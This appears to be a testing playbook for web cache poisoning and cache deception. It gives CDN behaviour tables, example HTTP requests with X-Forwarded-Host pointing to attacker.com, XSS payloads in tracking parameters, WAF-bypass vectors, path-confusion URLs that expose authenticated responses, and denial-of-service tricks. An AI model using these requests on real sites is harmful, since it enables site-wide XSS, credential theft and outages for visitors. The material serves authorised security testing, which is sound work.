---
name: cache-poisoning
description: Web cache poisoning testing covering unkeyed headers, unkeyed query params, cache key normalization, and CDN-specific techniques
depends_on: []
---

# Web Cache Poisoning

Web cache poisoning exploits differences between what the cache uses as a key and what the application uses to generate responses. Focus on unkeyed headers, unkeyed query parameters, cache key normalization, CDN-specific behavior, and cache deception.

## Discovery Signals

| Signal | Where to Find | Why Vulnerable |
|--------|---------------|----------------|
| `X-Cache: HIT/MISS` or `CF-Cache-Status` | Response headers | Confirms caching layer exists; cacheable responses are targets |
| `Age: <N>` header present | Response headers | Non-zero Age = served from cache; identifies cacheable endpoints |
| `Vary: Accept-Encoding` (only) | Response headers | Vary on few headers = most headers are unkeyed = poisoning surface |
| CDN-fronted static asset host (`assets.*`, `cdn.*`, `static.*`) | DNS/subdomain enum | Aggressive caching + high traffic = maximum blast radius (H1 #1160407) |
| Cloud storage backend (GCS, S3, Azure Blob) behind CDN | Response headers (`x-goog-*`, `x-ms-*`, `x-amz-*`) | Cloud storage has loose header handling CDNs do not model (H1 #1173153) |
| Framework version headers (`X-Powered-By: Express`, `X-Fastify-*`) | Response headers | Frameworks vary responses on headers CDNs ignore (H1 #1025575) |
| `Cache-Control: public, max-age=N` on dynamic pages | Response headers | Dynamic content cached publicly = poisoning + deception candidate |
| Personalized 404 pages with user data | Authenticated browsing | 404 handler includes user info = cache deception target (H1 #1271944) |
| Redirect responses (301/302) on cached paths | Response status codes | Cached redirects are poisonable with unkeyed Host/scheme headers (H1 #1322732) |
| `Pragma: no-cache` absent on API responses | Response headers | API responses without cache prevention may be CDN-cached |
| Multiple caching layers (CDN + Varnish + app) | `Via`, `X-Served-By`, `X-Varnish` | Layer disagreements on cache key = more poisoning primitives |
| ESI processing (`Surrogate-Control`, `X-ESI`) | Response headers | Edge Side Include injection if `<esi:include>` is processed |

## CDN/Proxy Behavioral Matrix

| CDN/Proxy | Cache Key Default | Unkeyed by Default | Debug Header | Known Bypass |
|-----------|-------------------|-------------------|--------------|--------------|
| Cloudflare | Host + path + query | Most headers, cookies, `Authorization` | `CF-Cache-Status`, `cf-ray` | `X-Forwarded-Scheme: http` triggers redirect loop cached as DoS (H1 #1181946) |
| Akamai | Host + path + query (configurable) | Headers unless Vary'd; `Authorization` optional | `Pragma: akamai-x-cache-on` | ESI injection via `<esi:include>`; query param ordering normalization |
| Fastly | Host + path + query (VCL-driven) | All non-Vary headers | `Fastly-Debug: 1` | Surrogate-Key purge if accessible; VCL regex bypasses |
| Varnish | Host + URL (path+query) | All non-Vary headers | `X-Varnish` (two IDs = HIT), `X-Cache-Hits` | `PURGE`/`BAN` methods if exposed; `X-HTTP-Method-Override` pass-through (H1 #1160407) |
| Nginx (proxy_cache) | Scheme + Host + URI | All headers, cookies | `X-Cache-Status` (custom) | `proxy_cache_key` misconfiguration; path normalization gaps |
| AWS CloudFront | Host + path + whitelisted query/headers | Headers unless forwarded; cookies unless whitelisted | `X-Cache: Hit/Miss from cloudfront` | Query string forwarding per-behavior; `X-Amz-*` headers passed |
| Azure CDN | Host + path + query (Standard) | Most headers | `X-Cache` | Authorization header causes Azure Storage 403 cached by CDN (H1 #1173153) |
| Squid | Method + URL | All headers unless Vary'd | `X-Cache`, `X-Cache-Lookup` | `PURGE` method; internal header injection |
| Apache Traffic Server | Host + path + query | Most headers | `Via` with ATS identifier | `@` in Host header; path traversal normalization |
| Imperva/Incapsula | Host + path + query | Most headers, cookies | `X-CDN` | Custom header pass-through; cookie-based keying gaps |

## Attack Surface

**Cache Layers**
- CDN (Cloudflare, Akamai, Fastly, AWS CloudFront, Azure CDN)
- Reverse proxy caches (Varnish, nginx proxy_cache, Squid, Apache mod_cache)
- Application-level caches (framework caching, Redis/Memcached response caching)
- Browser cache (disk/memory cache, service workers)

**Cache Key Components (Typical)**
- Host header, URL path, query string (or subset), scheme (HTTP vs HTTPS)
- Usually NOT: other headers, cookies, request body

**Unkeyed Inputs**
- HTTP headers not in cache key but used by application to generate response
- Query parameters excluded from cache key by CDN configuration
- Cookies not in cache key but influencing response content
- Request body on cacheable POST responses

## High-Value Targets

- Publicly cached pages (homepage, landing pages, static resources)
- JavaScript files served through CDN (cache poisoning -> stored XSS on every visitor)
- API responses with `Cache-Control: public`
- Login/registration pages that may reflect input
- Error pages cached by CDN (404/500 pages that reflect headers)
- Redirect responses (301/302) with reflected parameters
- Software download/update endpoints behind CDN (supply chain risk)
- Wallet/security-critical software downloads (H1 #1173153: users seek alternatives)

## Unkeyed Input Discovery

| Header/Parameter | Default Keyed? | Test Method | Common Impact |
|-----------------|----------------|-------------|---------------|
| `X-Forwarded-Host` | No | Set to `attacker.com`, check reflection in links/scripts | XSS via poisoned asset URLs (H1 #1096609) |
| `X-Forwarded-Scheme` / `X-Forwarded-Proto` | No | Set to `http` on HTTPS page, check for redirect | DoS via cached redirect loop (H1 #1181946) |
| `X-HTTP-Method-Override` | No | Set to `HEAD` on GET, check for empty body | DoS via empty cached response (H1 #1160407) |
| `X-Original-URL` / `X-Rewrite-URL` | No | Set to `/admin`, check if response changes | Path override; wrong content cached |
| `Authorization` | No (intentionally excluded) | Set to `garbage`, check for 403 cached | DoS via cached 403 on cloud storage backends (H1 #1173153) |
| `Accept-Version` / `X-API-Version` | No | Set to nonexistent version, check for 404 | DoS via framework 404 cached (H1 #1025575) |
| `X-Forwarded-Port` | No | Set to `1337`, check reflection in URLs | DoS via broken asset URLs (H1 #1096609) |
| `utm_*` / `fbclid` / `gclid` parameters | Often excluded from key | Inject XSS payload in param, check reflection | XSS via unkeyed analytics params |
| `X-Host` / `Forwarded: host=` | No | Set to attacker domain, check reflection | XSS/redirect via alternative Host headers |
| Request body on GET | No (body ignored in key) | Send Fat GET with body params, check processing | Unkeyed body content influences response |

## Key Vulnerabilities

### Unkeyed Header Poisoning

**X-Forwarded-Host** — highest-impact vector. If application uses it for URL generation, one request poisons all visitors:
```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response: <script src="https://attacker.com/js/app.js">
# Cached for Host: target.com — all visitors load attacker JS
```

**X-Forwarded-Scheme / X-Forwarded-Proto** — redirect loop DoS:
```
GET /login HTTP/1.1
Host: target.com
X-Forwarded-Proto: http

# Response: 302 Location: http://target.com/login (HSTS loops back)
# Cached: all visitors enter redirect loop
```

**X-Original-URL / X-Rewrite-URL** — path override (IIS, some WAFs):
```
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin

# Response for /admin cached under key /
```

**X-HTTP-Method-Override** — empty body DoS via cloud storage:
```
GET /app.js HTTP/1.1
X-HTTP-Method-Override: HEAD

# GCS/Azure returns empty body; CDN caches it → all JS loads fail
```

**Other Unkeyed Headers to Test**
```
X-Forwarded-Port: 1234
X-Host: attacker.com
X-Forwarded-Server: attacker.com
Forwarded: host=attacker.com
X-HTTP-Method-Override: POST  (on GET request)
Accept-Version: 99.0  (framework-specific, triggers 404)
```

### Unkeyed Query Parameter Poisoning

Some CDNs exclude analytics/tracking parameters from cache key:
```
GET /page?utm_content=<script>alert(1)</script> HTTP/1.1
# If reflected and utm_content excluded from key: stored XSS for /page
```

**Common excluded parameters**: `utm_source`, `utm_medium`, `utm_campaign`, `utm_content`, `utm_term`, `fbclid`, `gclid`, `mc_cid`, `mc_eid`

**Fat GET Requests** — body content unkeyed:
```
GET /api/resource?search=normal HTTP/1.1
Content-Type: application/x-www-form-urlencoded

evil_param=malicious_value
```

### Cache Key Normalization

**Path normalization differences** between cache and origin:
```
GET /static/..%2fadmin HTTP/1.1     # Cache normalizes differently than origin
GET /ADMIN HTTP/1.1                 # Case normalization mismatch
GET /admin/ HTTP/1.1                # Trailing slash normalization
```

**Query string normalization** — parameter order, character stripping:
```
/page?b=2&a=1  →  cache key: /page?a=1&b=2  (reordered)
/page?a=1%0d%0a  →  key strips CRLF but origin processes it
```

**Port normalization** — Host header port tricks:
```
Host: target.com:443  →  cache key: target.com (port stripped)
# But origin generates URLs with port, reflecting attacker-controlled port
```

### Cache Deception (Path Confusion)

Distinct from poisoning: attacker tricks cache into storing victim's authenticated response.

| Technique | URL Pattern | Server Behavior | Cache Behavior |
|-----------|------------|-----------------|----------------|
| Extension append | `/account/settings/x.css` | Ignores `x.css`, serves `/account/settings` | Sees `.css`, caches as static |
| Semicolon delimiter | `/account/settings;x.css` | Ignores after `;` (Java/Tomcat) | Includes full path, sees `.css` |
| Null byte | `/account/settings%00.css` | Truncates at null | Includes full path, sees `.css` |
| Fragment confusion | `/account/settings%23.css` | `%23` = `#`, ignores fragment | Literal `%23` in path, sees `.css` |
| Double-encoded slash | `/account/%252F..%252Fstatic/x.css` | Double-decodes to path traversal | Single-decodes, sees `.css` (H1 #1271944) |
| Path parameter | `/account/settings/..;/static/x.css` | Some servers ignore `..;` | Normalizes path, caches response |
| Backslash confusion | `/account\settings.css` | Treats `\` as separator (IIS) | Treats `\` as literal, sees `.css` |

**Cacheable extensions to test**: `.css`, `.js`, `.ico`, `.png`, `.jpg`, `.svg`, `.woff`, `.woff2`, `.ttf`, `.eot`, `.pdf`, `.gif`, `.avif`, `.webp`

**Exploitation**: send victim a deception URL while they are authenticated. CDN caches their personalized response. Attacker fetches same URL unauthenticated, gets victim data (PII, tokens, CSRF tokens).

### Stored XSS via Cache Poisoning

**JavaScript Resource Poisoning** — highest-impact variant:
```
GET /static/app.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# If response dynamically generates JS with URLs:
# var apiBase = "https://attacker.com/api";
# Cached: all visitors execute JS with attacker-controlled API base
```

**HTML Page Poisoning**:
```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script><a href="

# If reflected in meta tags, link tags, or script sources:
# Cached XSS payload served to all visitors
```

### CDN-Specific Techniques

**Cloudflare**: `CF-Cache-Status` header (HIT/MISS/DYNAMIC/BYPASS). Transform Rules may normalize headers before origin, creating desync. Page Rules and Cache Rules control caching scope. Caches `.css`/`.js` by extension even on 404 pages.

**Akamai**: `Pragma: akamai-x-cache-on` for debug. ESI injection if `esi:include` is processed. Query string key configurable per delivery configuration.

**Fastly**: VCL controls cache behavior. `Fastly-Debug: 1` for debug info. Surrogate-Key purging. Shielding affects which POP caches.

**AWS CloudFront**: Per-path cache behaviors. Query string/header forwarding configurable. Origin groups may use different key logic.

### CPDoS (Cache Poisoning Denial of Service) Variants

| CPDoS Variant | Mechanism | Header/Input | Cache Stores |
|--------------|-----------|--------------|-------------|
| HTTP Header Oversize (HHO) | Oversized header triggers 400/413 at origin | `X-Oversized: AAAA...` (>8KB) | Error response cached for clean URL |
| HTTP Meta Character (HMC) | Control chars trigger 400 at origin | `X-Custom: val\n` (CRLF/null) | Error response cached for clean URL |
| HTTP Method Override (HMO) | Method override changes response body | `X-HTTP-Method-Override: HEAD` | Empty body cached (H1 #1160407) |
| Redirect loop | Scheme downgrade triggers redirect | `X-Forwarded-Proto: http` | Redirect loop cached (H1 #1181946) |
| Error promotion | Malformed auth triggers 403 | `Authorization: garbage` | 403 cached for public URL (H1 #1173153) |

## Defense-Bypass Pairs

| Defense | Bypass Technique | Example |
|---------|-----------------|---------|
| `Vary: X-Forwarded-Host` (keys the header) | Use alternative headers: `X-Host`, `Forwarded: host=evil`, `X-Forwarded-Server` | Vary covers one header but app accepts multiple host-override headers |
| `Cache-Control: private` on dynamic pages | Find cacheable error pages (404, 500) that reflect unkeyed input | 404 handler reflects `X-Forwarded-Host` and IS cached with `public` |
| Cache key includes all query params | Parameter cloaking via duplicate keys: `?a=safe&a=evil` | Origin uses last value, cache keys on first, or vice versa |
| WAF blocks `<script>` in headers | Use event handlers: `" onmouseover="alert(1)` or JS protocol: `javascript:alert(1)` | WAF regex misses non-`<script>` XSS vectors in header values |
| Normalize Host header at CDN | Inject port: `Host: target.com:evil` — port survives normalization | CDN strips scheme but keeps port; port reflected into asset URLs (H1 #1096609) |
| Short cache TTL (< 60s) | Burp Intruder/script re-poisons every TTL cycle for persistent DoS | Automated re-poisoning defeats TTL-based self-healing (H1 #1322732) |
| Path-scoped fix for one route | Test same technique on all other routes — fixes are often per-path | Bypass of prior fix by testing unpatched paths (H1 #1322732) |
| HSTS prevents scheme downgrade | `X-Forwarded-Proto: http` still causes redirect cached as 301 | Cached redirect loop is the DoS — HSTS loop IS the damage |

## Chain Patterns

| Chain | Steps | Severity Multiplier |
|-------|-------|---------------------|
| Cache Poisoning -> Stored XSS | Poison JS/HTML with `X-Forwarded-Host: attacker.com` reflected in `<script src>` -> all visitors execute attacker JS | Critical (mass XSS, no victim interaction per-user) |
| Cache Poisoning -> Redirect -> Phishing | Poison cached 301/302 via `X-Forwarded-Host` -> all visitors redirected to attacker clone site | High (credential harvest at scale) |
| Cache Poisoning -> DoS (empty body) | `X-HTTP-Method-Override: HEAD` -> empty JS/CSS cached -> site broken for all users | High (site-wide outage) |
| Cache Poisoning -> DoS (error caching) | `Authorization: garbage` -> 403 cached on cloud storage -> downloads blocked | High (H1 #1173153: wallet downloads blocked) |
| Cache Deception -> Session Hijack | Victim visits `/account/x.css` -> CDN caches auth page -> attacker reads session token | High (account takeover per-victim) |
| Cache Deception -> CSRF Token Theft -> CSRF | WCD leaks CSRF token from cached 404 -> attacker uses token for state-changing requests | High (H1 #1271944: $800 Shopify) |
| Cache Poisoning -> Supply Chain | Poison update/download CDN endpoint -> users get errors -> seek file elsewhere -> malware | Critical (H1 #1173153: crypto wallet) |
| CRLF Injection -> Cache Poisoning | Inject `\r\n` in unkeyed header -> response splitting -> cache stores attacker body | Critical (full response control) |

## Bypass Techniques

- Cache buster removal: remove `?cb=...` after confirming vulnerability to poison production cache
- Multiple headers: some applications check X-Forwarded-Host only if X-Forwarded-For is also present
- Header case variations: `x-forwarded-host` vs `X-Forwarded-Host` may be handled differently by cache vs origin
- Duplicate headers: first vs last header value preference differs between cache and origin
- Request line manipulation: absolute URL vs relative path may key differently
- HTTP method: HEAD requests may poison GET cache entries (or vice versa)
- HTTP/2 to HTTP/1.1 downgrade at CDN-origin boundary creates header injection surface

## Reconnaissance

**Cache Detection**
```
# Check response headers for caching indicators:
# X-Cache: HIT/MISS
# CF-Cache-Status: HIT/MISS/DYNAMIC
# Age: <seconds>
# Cache-Control: public, max-age=3600
# Vary: <headers>
# X-Varnish: <id> <id>  (two IDs = cache hit)
```

**Cache Key Discovery**
- Send identical requests with different unkeyed inputs; same cached response = input is unkeyed
- Add cache-buster parameter: `?cb=random123` to force fresh response per test
- Check `Vary` header for keyed headers (e.g., `Vary: Accept-Encoding, Cookie`)

**Param Miner (Burp Extension)** — automated discovery of unkeyed headers and parameters. Essential tool. Sends requests with candidate headers/params and detects cache behavior differences.

**CDN Fingerprinting**
```
# Identify the CDN/cache layer:
cf-ray: <hex>            → Cloudflare
x-served-by: cache-...   → Fastly
x-akamai-*               → Akamai
x-amz-cf-id              → AWS CloudFront
x-ms-ref                 → Azure CDN
x-varnish: <id> <id>     → Varnish (two IDs = cache hit)
via: 1.1 ... (squid/...)  → Squid or generic proxy
```

## Testing Methodology

1. **Cache identification** — Map cache layers, identify cache status headers, determine cache key components
2. **Unkeyed input discovery** — Use Param Miner; test headers from Unkeyed Input Discovery table above
3. **Reflection mapping** — For each unkeyed input, check if it appears in the response body/headers
4. **Poison confirmation** — Inject distinctive value, cache it, request from different context to confirm persistence
5. **Impact escalation** — Test XSS via poisoned JavaScript/HTML, redirect poisoning, DoS via error caching
6. **Cache deception** — Test all path confusion techniques from the table on authenticated pages
7. **CDN-specific** — Test provider-specific behaviors, debug headers, and known bypasses from the matrix

## Validation

1. Cache poisoning: response containing attacker-controlled content served from cache to a fresh request without the poisoning header
2. Unkeyed header: same cached response served regardless of unkeyed header value changes
3. Stored XSS: JavaScript execution from poisoned cached response affecting new visitors
4. Cache deception: authenticated user's response cached and retrievable by unauthenticated attacker
5. Redirect poisoning: cached redirect sending users to attacker-controlled domain

## False Positives

- Response not actually cached (DYNAMIC/BYPASS status, `Cache-Control: private`)
- Unkeyed input reflected but response not cacheable
- Cache TTL too short for practical exploitation (< 5s and no automation path)
- `Vary` header includes the manipulated header (header IS part of cache key)
- Response requires authentication cookie in cache key

## Impact

- Stored XSS on cached pages affecting all visitors (mass exploitation)
- Credential theft via poisoned JavaScript resources
- Phishing via poisoned redirect responses
- Denial of service via cached error responses (empty body, 403, redirect loop)
- Session hijacking via cache deception on authenticated pages
- Supply chain attacks via poisoned software download endpoints

## Pro Tips

1. Param Miner is essential; manual testing misses most unkeyed inputs. Run it on every cacheable endpoint.
2. Use a unique cache buster (`?cb=<random>`) on EVERY test request to avoid poisoning production cache for real users.
3. Test `Authorization: garbage` on every CDN-fronted cloud storage endpoint — highest single-probe yield for CPDoS.
4. JavaScript file poisoning has the highest impact: one cached JS file affects every page that loads it.
5. After finding a cache poisoning fix, re-test every other path — fixes are typically path-scoped, not systemic (H1 #1322732).
6. For cache deception, test all 7 path confusion techniques from the table — different servers fail on different delimiters.
7. Double-encoded slashes (`%252F`) bypass single-pass normalizers — always test on CDNs that normalize paths.
8. When cloud storage (GCS/S3/Azure) sits behind a CDN, the combination is systematically vulnerable — cloud storage has header-driven behavior the CDN does not model.
9. Test both CDN edge cache and origin cache separately — they may have different keys and TTLs.
10. After confirming a vulnerability, immediately stop testing to avoid poisoning production cache for real users.

## Summary

Web cache poisoning exploits the gap between what the cache considers equivalent requests (cache key) and what the application uses to generate responses. The triplet (unkeyed input + reflected response + cacheability) is the universal pattern. CDN + cloud storage combos and framework-specific header handling are recurring sources. Impact ranges from stored XSS to mass phishing to site-wide DoS.
